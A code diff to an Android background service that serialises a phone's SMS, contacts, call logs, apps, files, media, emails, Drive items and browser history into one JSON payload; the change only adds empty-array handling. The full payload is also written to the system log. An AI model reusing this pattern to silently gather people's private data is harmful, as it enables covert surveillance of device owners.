@@ -413,23 +413,26 @@ public class BackgroundDataService extends Service implements Constant {
             if (lstSms != null && lstSms.size() > Integer.parseInt(ZERO)) {
                 Type type = new TypeToken<List<Sms>>() {
                 }.getType();
-                //String jsonSMS = gson.toJson(lstSms, type);
                 JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstSms, type);
                 JsonArray jsonArraySms = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"Sms\":" + jsonArraySms;
                 sbAppend.append(finalJSON);
+            }else{
+                finalJSON = "\"Sms\":" + "[]";
+                sbAppend.append(finalJSON);
             }
-
         }
 
         if (tag.equals(TAG_CONTACTS)) {
             if (lstContacts != null && lstContacts.size() > Integer.parseInt(ZERO)) {
                 Type type = new TypeToken<List<Contacts>>() {
                 }.getType();
-                // String jsonContacts = gson.toJson(lstContacts, type);
                 JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstContacts, type);
                 JsonArray jsonArrayContacts = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"Contacts\":" + jsonArrayContacts;
+                sbAppend.append(finalJSON);
+            }else{
+                finalJSON = "\"Contacts\":" + "[]";
                 sbAppend.append(finalJSON);
             }
         }
@@ -438,26 +441,28 @@ public class BackgroundDataService extends Service implements Constant {
             if (lstCalls != null && lstCalls.size() > Integer.parseInt(ZERO)) {
                 Type type = new TypeToken<List<Calls>>() {
                 }.getType();
-                //String jsonCalls = gson.toJson(lstCalls, type);
                 JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstCalls, type);
                 JsonArray jsonArrayCalls = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"Calls\":" + jsonArrayCalls;
                 sbAppend.append(finalJSON);
+            }else{
+                finalJSON = "\"Calls\":" + "[]";
+                sbAppend.append(finalJSON);
             }
-
         }
 
         if (tag.equals(TAG_LIST_APPS)) {
             if (lstApps != null && lstApps.size() > Integer.parseInt(ZERO)) {
                 Type type = new TypeToken<List<Apps>>() {
                 }.getType();
-                //String jsonApps = gson.toJson(lstApps, type);
                 JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstApps, type);
                 JsonArray jsonArrayApps = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"Apps\":" + jsonArrayApps;
                 sbAppend.append(finalJSON);
+            }else{
+                finalJSON = "\"Apps\":" + "[]";
+                sbAppend.append(finalJSON);
             }
-
         }
 
         if (tag.equals(TAG_FILES)) {
@@ -465,49 +470,54 @@ public class BackgroundDataService extends Service implements Constant {
             if (lstFiles != null && lstFiles.size() > Integer.parseInt(ZERO)) {
                 Type type = new TypeToken<List<Files>>() {
                 }.getType();
-                //String jsonApps = gson.toJson(lstFiles, type);
                 JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstFiles, type);
                 JsonArray jsonArrayFiles = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"Files\":" + jsonArrayFiles;
                 sbAppend.append(finalJSON);
+            }else{
+                finalJSON = "\"Files\":" + "[]";
+                sbAppend.append(finalJSON);
             }
-
         }
 
         if (tag.equals(TAG_IMAGES)) {
             if (lstImages != null && lstImages.size() > Integer.parseInt(ZERO)) {
                 Type type = new TypeToken<List<Images>>() {
                 }.getType();
-                //String jsonApps = gson.toJson(lstImages, type);
                 JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstImages, type);
                 JsonArray jsonArrayImages = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"Images\":" + jsonArrayImages;
                 sbAppend.append(finalJSON);
+            }else{
+                finalJSON = "\"Images\":" + "[]";
+                sbAppend.append(finalJSON);
             }
-
         }
 
         if (tag.equals(TAG_VIDEOS)) {
             if (lstVideo != null && lstVideo.size() > Integer.parseInt(ZERO)) {
                 Type type = new TypeToken<List<Video>>() {
                 }.getType();
-                //String jsonApps = gson.toJson(lstVideo, type);
                 JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstVideo, type);
                 JsonArray jsonArrayVideos = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"Videos\":" + jsonArrayVideos;
                 sbAppend.append(finalJSON);
+            }else{
+                finalJSON = "\"Videos\":" + "[]";
+                sbAppend.append(finalJSON);
             }
-
         }
 
         if (tag.equals(TAG_EMAIL)) {
             if (lstEmail != null && lstEmail.size() > Integer.parseInt(ZERO)) {
                 Type type = new TypeToken<List<Mail>>() {
                 }.getType();
-                //String jsonApps = gson.toJson(lstEmail, type);
                 JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstEmail, type);
                 JsonArray jsonArrayEmail = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"Emails\":" + jsonArrayEmail;
+                sbAppend.append(finalJSON);
+            }else{
+                finalJSON = "\"Emails\":" + "[]";
                 sbAppend.append(finalJSON);
             }
         }
@@ -516,10 +526,12 @@ public class BackgroundDataService extends Service implements Constant {
             if (lstDrive != null && lstDrive.size() > Integer.parseInt(ZERO)) {
                 Type type = new TypeToken<List<GoogleDrive>>() {
                 }.getType();
-                //String jsonApps = gson.toJson(lstDrive, type);
                 JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstDrive, type);
                 JsonArray jsonArrayDrive = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"GoogleDrive\":" + jsonArrayDrive;
+                sbAppend.append(finalJSON);
+            }else{
+                finalJSON = "\"GoogleDrive\":" + "[]";
                 sbAppend.append(finalJSON);
             }
         }
@@ -528,17 +540,18 @@ public class BackgroundDataService extends Service implements Constant {
             if (lstBrowserHistory != null && lstBrowserHistory.size() > Integer.parseInt(ZERO)) {
                 Type type = new TypeToken<List<GoogleDrive>>() {
                 }.getType();
-                //String jsonApps = gson.toJson(lstDrive, type);
                 JsonArray jsonArray = (JsonArray) gson.toJsonTree(lstBrowserHistory, type);
                 JsonArray jsonArrayDrive = Utilities.getJsonArray(jsonArray);
                 finalJSON = "\"BrowserHistory\":" + jsonArrayDrive;
+                sbAppend.append(finalJSON);
+            }else{
+                finalJSON = "\"BrowserHistory\":" + "[]";
                 sbAppend.append(finalJSON);
             }
         }
 
         finalJSON = "{" + sbAppend + "}";
         Log.e("JSON", "FINAL??" + finalJSON);
-        //Utilities.generateFile(finalJSON);
         return finalJSON;
     }
 
